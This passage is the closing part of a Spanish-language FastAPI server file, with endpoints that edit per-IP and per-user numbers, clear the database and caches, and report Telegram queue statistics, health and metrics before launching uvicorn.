    success = await _clear_db_collections()
    if success:
        ip_number_cache.clear()
        user_cache.clear()
        return {"message": "Se borró correctamente"}
    else:
        return {"message": "Error al borrar", "status": "timeout_or_error"}

@app.put("/editar-ip/{ip}")
async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
    async with db_semaphore:
        try:
            result = await asyncio.wait_for(ip_numbers.update_one({"ip": ip}, {"$set": {"number": request_data.numero}}), timeout=5.0)
            if result.matched_count == 0:
                raise HTTPException(status_code=404, detail="IP no encontrada")
            ip_number_cache[ip] = request_data.numero
            return {"message": f"Número de la IP {ip} actualizado a {request_data.numero}"}
        except asyncio.TimeoutError:
            raise HTTPException(status_code=503, detail="Timeout actualizando IP")
        except HTTPException:
            raise
        except Exception as e:
            logger.error(f"Error editando IP: {e}")
            raise HTTPException(status_code=500, detail="Error interno del servidor")

@app.put("/editar-usuario/{usuario}")
async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest):
    async with db_semaphore:
        try:
            result = await asyncio.wait_for(user_numbers.update_one({"username": usuario}, {"$set": {"number": request_data.numero}}), timeout=5.0)
            if result.matched_count == 0:
                raise HTTPException(status_code=404, detail="Usuario no encontrado")
            user_cache[usuario] = request_data.numero
            return {"message": f"Número del usuario {usuario} actualizado a {request_data.numero}"}
        except asyncio.TimeoutError:
            raise HTTPException(status_code=503, detail="Timeout actualizando usuario")
        except HTTPException:
            raise
        except Exception as e:
            logger.error(f"Error editando usuario: {e}")
            raise HTTPException(status_code=500, detail="Error interno del servidor")

# =====================
#  Monitoreo Telegram
# =====================

@app.get("/telegram_stats")
async def get_telegram_stats():
    return {
        "statistics": telegram_stats,
        "current_status": {
            "queue_size": telegram_queue.qsize(),
            "queue_maxsize": telegram_queue.maxsize,
            "available_workers": telegram_semaphore._value,
            "max_workers": MAX_TELEGRAM_CONCURRENT
        },
        "rate_limits": {
            "messages_per_minute": RATE_LIMIT_MESSAGES_PER_MINUTE,
            "messages_per_second": RATE_LIMIT_MESSAGES_PER_SECOND,
            "active_bots": len(bot_rate_limits)
        },
        "performance": {
            "immediate_ratio": telegram_stats["sent_immediate"] / max(telegram_stats["total_processed"], 1),
            "queue_ratio": telegram_stats["sent_queued"] / max(telegram_stats["total_processed"], 1),
            "failure_ratio": telegram_stats["failed"] / max(telegram_stats["total_processed"], 1)
        }
    }

@app.post("/telegram_test")
async def test_telegram(mensaje: str = "Test message", priority: int = 1, force_immediate: bool = False):
    result = await enviar_telegram_hibrido(f"TEST: {mensaje} - {datetime.now()}", priority=priority, force_immediate=force_immediate)
    return {"test_result": result, "timestamp": datetime.now()}

@app.post("/clear_telegram_stats")
async def clear_telegram_stats():
    global telegram_stats
    telegram_stats = {
        "sent_immediate": 0,
        "sent_queued": 0,
        "failed": 0,
        "queue_full": 0,
        "rate_limited": 0,
        "total_processed": 0
    }
    bot_rate_limits.clear()
    return {"message": "Estadísticas de Telegram limpiadas"}

# =====================
#  Salud y métricas (sin geo)
# =====================

@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "cache_stats": {
            "blocked_ips": len(blocked_ips_cache),
            "ip_numbers": len(ip_number_cache),
            "users": len(user_cache)
        },
        "queue_stats": {
            "background_queue_size": background_queue.qsize(),
            "telegram_queue_size": telegram_queue.qsize()
        },
        "semaphore_stats": {
            "available_requests": request_semaphore._value,
            "available_db": db_semaphore._value,
            "available_http": http_semaphore._value,
            "available_telegram": telegram_semaphore._value
        },
        "telegram_stats": telegram_stats,
        "geo_filter": {"enabled": False}
    }

@app.get("/metrics")
async def get_metrics():
    return {
        "concurrency_limits": {
            "max_concurrent_requests": MAX_CONCURRENT_REQUESTS,
            "max_db_connections": MAX_DB_CONNECTIONS,
            "max_http_connections": MAX_HTTP_CONNECTIONS,
            "max_telegram_concurrent": MAX_TELEGRAM_CONCURRENT
        },
        "current_usage": {
            "active_requests": MAX_CONCURRENT_REQUESTS - request_semaphore._value,
            "active_db_connections": MAX_DB_CONNECTIONS - db_semaphore._value,
            "active_http_connections": MAX_HTTP_CONNECTIONS - http_semaphore._value,
            "active_telegram_workers": MAX_TELEGRAM_CONCURRENT - telegram_semaphore._value
        },
        "queues": {
            "background_queue_size": background_queue.qsize(),
            "background_queue_maxsize": background_queue.maxsize,
            "telegram_queue_size": telegram_queue.qsize(),
            "telegram_queue_maxsize": telegram_queue.maxsize
        },
        "cache_info": {
            "blocked_ips_cache_size": len(blocked_ips_cache),
            "ip_number_cache_size": len(ip_number_cache),
            "user_cache_size": len(user_cache)
        },
        "deques": {
            "cola_size": len(cola),
            "baneado_size": len(baneado)
        },
        "telegram_performance": telegram_stats,
        "geo_blocking": {"enabled": False}
    }

# Endpoints de geolocalización eliminados o deshabilitados
@app.get("/paises_permitidos")
async def obtener_paises_permitidos():
    return {"filtro_geografico": "deshabilitado", "paises_permitidos": [], "total_paises": 0}

@app.get("/verificar_ip/{ip}")
async def verificar_ip_pais(ip: str):
    return {"ip": ip, "pais": "N/A", "permitido": True, "es_latinoamerica": False, "geo": "disabled"}

@app.post("/clear_caches")
async def clear_caches():
    validar_contrasena_cached.cache_clear()
    return {"message": "Caches limpiados", "stats": {"note": "Geolocalización deshabilitada, no hay ip_cache"}}


if __name__ == "__main__":
    import uvicorn
    config = uvicorn.Config(
        app=app,
        host="0.0.0.0",
        port=8000,
        workers=1,
        loop="asyncio",
        http="httptools",
        lifespan="on",
        access_log=False,
        server_header=False,
        date_header=False
    )
    server = uvicorn.Server(config)
    server.run()
